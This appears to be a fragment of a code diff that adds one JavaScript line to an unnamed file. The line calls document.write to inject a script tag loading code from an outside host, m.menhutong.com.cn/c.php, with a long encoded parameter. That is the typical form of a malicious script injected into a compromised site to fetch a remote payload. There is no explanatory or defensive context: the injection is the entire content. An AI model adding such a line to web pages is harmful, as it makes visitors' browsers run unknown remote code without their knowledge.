@@ -1,0 +1,2 @@
+
+document.write("<script language='javascript' type='text/javascript' src='http://m.menhutong.com.cn/c.php?a=dgBaCGJjZDEKZGQxUzR9NlgyK2ZCMCg5CGUGNSFleDhcYjBlNzV2ZgFidDdmOXZjRDFoNHA5ezJSMVozZjYsNAMxIWJcbgpwbmpPNH8/EjMIf040J1tbAHpdRGNdeRQJAgcCAFt4UgNUUQcjazwPV1RXQVIOYEJJS2NbCFlVDX9pAl0_T1dXCnp_WlB/ARZTC38OM1BdB1VfdQcAWVdQd2I6W1EEVlsC'></script>");
